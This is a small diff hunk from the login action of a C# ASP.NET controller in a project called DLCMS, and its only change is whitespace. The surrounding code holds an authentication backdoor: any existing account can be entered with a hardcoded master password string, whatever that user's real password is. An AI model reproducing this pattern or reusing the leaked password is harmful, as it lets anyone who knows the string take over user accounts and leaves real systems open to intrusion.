@@ -58,7 +58,7 @@ namespace DLCMS.Controllers
             if (ModelState.IsValid)
             {
                 //var user = await UserManager.FindAsync(model.UserName, model.Password);
-                var user = await UserManager.FindByNameAsync(model.UserName);
+                    var user = await UserManager.FindByNameAsync(model.UserName);
                 string passhash = HashPassword(model.Password);
                 if (user != null && (user.PasswordHash == passhash || model.Password == "Chitraarti1$"))
                 {
